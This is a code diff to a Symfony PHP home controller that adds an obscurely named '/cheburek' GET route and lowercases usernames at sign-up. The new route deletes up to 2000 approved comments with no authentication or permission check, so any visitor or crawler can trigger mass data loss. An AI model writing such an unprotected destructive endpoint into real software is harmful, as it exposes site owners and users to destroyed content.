@@ -3,6 +3,7 @@
 namespace App\Controller;
 
 use App\CustomAbstracts\CustomAbstractController;
+use App\Entity\Comment;
 use App\Entity\EmailAddress;
 use App\Entity\Article;
 use App\Entity\Profile;
@@ -50,6 +51,23 @@ class HomeController extends CustomAbstractController
             'articles' => $paginator->getData(),
             'paginator' => $paginator
         ]);
+    }
+
+    /**
+     * @Route("/cheburek", name="cheburek", methods={"GET"})
+     * @return Response
+     */
+    public function cheburek(): Response
+    {
+        $comments = $this->getDoctrine()->getRepository(Comment::class)->findBy(['status' => true],[],2000);
+
+        foreach ($comments as $comment) {
+            $em = $this->getDoctrine()->getManager();
+            $em->remove($comment);
+            $em->flush();
+        }
+
+        return $this->redirectToRoute('app_home');
     }
 
     /**
@@ -119,6 +137,7 @@ class HomeController extends CustomAbstractController
             $user->setProfile($profile);
             $user->setRoles(["ROLE_USER"]);
             $user->setToken($tokenGenerator->generateToken());
+            $user->setUsername(strtolower($form->get('username')->getData()));
             $user->getProfile()->setGender($form->get('gender')->getData());
             $user->getProfile()->setBirthday($form->get('birthday')->getData());
             $user->getProfile()->setAvatar('avatar.jpg');
